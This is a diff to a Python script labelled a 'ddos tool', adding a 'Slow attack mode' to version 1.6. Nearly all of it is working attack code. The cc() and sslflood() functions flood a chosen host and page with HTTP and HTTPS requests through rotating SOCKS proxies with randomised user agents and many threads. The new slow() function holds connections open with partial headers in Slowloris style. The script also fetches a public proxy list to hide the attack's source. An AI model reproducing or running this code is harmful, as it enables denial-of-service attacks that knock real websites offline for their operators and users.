@@ -17,12 +17,12 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.5(beta)
+Python3 version 1.6(Slow mode added)
                             C0d3d by Lee0n123
 ===============================================
-             If you want to stop
-            this script, pls just
-              close the window.
+         --> Added Slow attack mode <--
+                      TOS:
+         Don't Attack Government Website.
 ===============================================''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
@@ -156,38 +156,6 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
 			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]
 
-ip = str(input("> Host/Ip:"))
-https = str(input("> Https(y/n):"))
-url = str(input("> Page you want to attack(default=/):"))
-port = str(input("> Port(Https default is 443):"))
-if port == '':
-	port = int(80)
-	print("> Default choose port 80\r\n> Port 80 was chosen")
-else:
-	port = int(port)
-thread_num = int(input("> Threads:"))
-N = str(input("> Do you need to get socks5 list?(y/n):"))
-if N == 'y':
-    r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
-    with open("socks.txt",'wb') as f:
-        f.write(r.content)
-    print("\r\n [!] Have already download socks5 list as socks.txt\r\n")
-else:
-    pass
-out_file = str(input("> Proxy file path(socks.txt):"))
-if out_file == '':
-    out_file = str("socks.txt")
-else:
-    out_file = str(out_file)
-print ("> Number Of Proxies: %s" %(len(open(out_file).readlines())))
-time.sleep(0.3)
-multiple = int(input("> Input the Magnification:"))
-
-if url == '':
-	url2 = "/"
-else:
-	url2 = str(url)
-
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
@@ -205,45 +173,43 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
-proxies = open(out_file).readlines()
+def cc():
+	get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	connection = "Connection: Keep-Alive\r\n"
+	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	accept = random.choice(acceptall)
+	referer = "Referer: https://www.google.com/?search="+ ip + url2 + "\r\n"
+	request = get_host + referer + useragent + accept + connection + "\r\n"
+	proxy = random.choice(proxies).strip().split(":")
+	while True:
+		try:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			s = socks.socksocket()
+			s.connect((str(ip), int(port)))
+			s.send(str.encode(request))
+			print ("[*] CC Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+			try:
+				for y in range(multiple):
+					s.send(str.encode(request))
+			except:
+				s.close()
+		except:
+			s.close()
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				s.connect((str(ip), int(port)))
+				s.send(str.encode(request))
+				print ("[*] CC Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+				try:
+					for y in range(multiple):
+						s.send(str.encode(request))
+				except:
+					s.close()
+			except:
+				print ("[!] Connection Error")
+				s.close()
 
-def run():
-    get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-    connection = "Connection: Keep-Alive\r\n"
-    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-    accept = random.choice(acceptall)
-    referer = "Referer: https://www.google.com/?search="+ ip + url2 + "\r\n"
-    request = get_host + referer + useragent + accept + connection + "\r\n"
-    proxy = random.choice(proxies).strip().split(":")
-    while True:
-        try:
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-            s = socks.socksocket()
-            s.connect((str(ip), int(port)))
-            s.send(str.encode(request))
-            print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!")
-            try:
-                for y in range(multiple):
-                    s.send(str.encode(request))
-            except:
-                s.close()
-        except:
-            s.close()
-            try:
-                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-                s.connect((str(ip), int(port)))
-                s.send(str.encode(request))
-                print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!\r\n")
-                try:
-                    for y in range(multiple):
-                        s.send(str.encode(request))
-                except:
-                    s.close()
-            except:
-                print ("<ERROR>----<socks down>")
-                s.close()
-
-def run2():
+def sslflood():
 	get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	referer = "Referer: https://www.google.com/?search="+ ip + url2 + "\r\n"
 	connection = "Connection: Keep-Alive\r\n"
@@ -258,7 +224,7 @@ def run2():
 				s.connect((str(ip), int(port)))
 				ss = ssl.wrap_socket(s)
 				ss.send(str.encode(request))
-				print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!")
+				print ("[*] HTTPS Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
 				try:
 					for y in range(multiple):
 						ss.send(str.encode(request))
@@ -272,21 +238,97 @@ def run2():
 					s.connect((str(ip), int(port)))
 					ss = ssl.wrap_socket(s)
 					ss.send(str.encode(request))
-					print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!\r\n")
+					print ("[*] HTTPS Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
 					try:
 						for y in range(multiple):
 							ss.send(str.encode(request))
 					except:
 						s.close()
 				except:
-					print ("<ERROR>----<socks down>")
+					print ("[!] Connection Error")
 					s.close()
 
-if https == "y":
-	for i in range(thread_num):
-		th = threading.Thread(target = run2)
-		th.start()
-else:
-	for i in range(thread_num):
-		th = threading.Thread(target = run)
-		th.start()
+def slow():
+	proxy = random.choice(proxies).strip().split(":")
+	accept = random.choice(acceptall)
+	while True:
+		try:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			s = socks.socksocket()
+			s.connect((str(ip), int(port)))
+			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
+			s.send(("Connection:keep-alive").encode("utf-8"))
+			print("[*] Slow attack from --> "+str(proxy[0])+":"+str(proxy[1]))
+			print("[!] Wait 14 seconds to resend request")
+			time.sleep(14)
+			try:
+				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+				print("[*] Resent from --> "+str(proxy[0])+":"+str(proxy[1]))
+			except:
+				s.send(accept)
+				print("[!] Request resent")
+		except:
+			s.close()
+			print("[!] Waiting")
+
+def main():
+	global ip
+	global url2
+	global port
+	global proxies
+	global multiple
+	mode = str(input("> Choose Your Mode (cc/slow) :"))
+	ip = str(input("> Host/Ip:"))
+	https = str(input("> Https(y/n):"))
+	url = str(input("> Page you want to attack(default=/):"))
+	port = str(input("> Port(Https default is 443):"))
+	if port == '':
+		port = int(80)
+		print("> Default choose port 80\r\n> Port 80 was chosen")
+	else:
+		port = int(port)
+	thread_num = int(input("> Threads:"))
+	N = str(input("> Do you need to get socks5 list?(y/n):"))
+	if N == 'y':
+		r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+		with open("socks.txt",'wb') as f:
+			f.write(r.content)
+			print("\r\n [!] Have already download socks5 list as socks.txt\r\n")
+	else:
+		pass
+	out_file = str(input("> Proxy file path(socks.txt):"))
+	if out_file == '':
+		out_file = str("socks.txt")
+	else:
+		out_file = str(out_file)
+	print ("> Number Of Proxies: %s" %(len(open(out_file).readlines())))
+	proxies = open(out_file).readlines()
+	time.sleep(0.03)
+	if mode == "slow":
+		pass
+	else:
+		multiple = int(input("> Input the Magnification:"))
+	if url == '':
+		url2 = "/"
+	else:
+		url2 = str(url)
+	if mode == "slow":
+		for i in range(thread_num):
+			th = threading.Thread(target = slow)
+			th.start()
+	elif mode == "cc":
+		if https == "y":
+			for i in range(thread_num):
+				th = threading.Thread(target = sslflood)
+				th.start()
+		if https == "" :
+				for i in range(thread_num):
+					th = threading.Thread(target = cc)
+					th.start()
+	else:
+		print("[!] Input Error")
+		sys.exit()
+
+if __name__ == "__main__":
+	main()
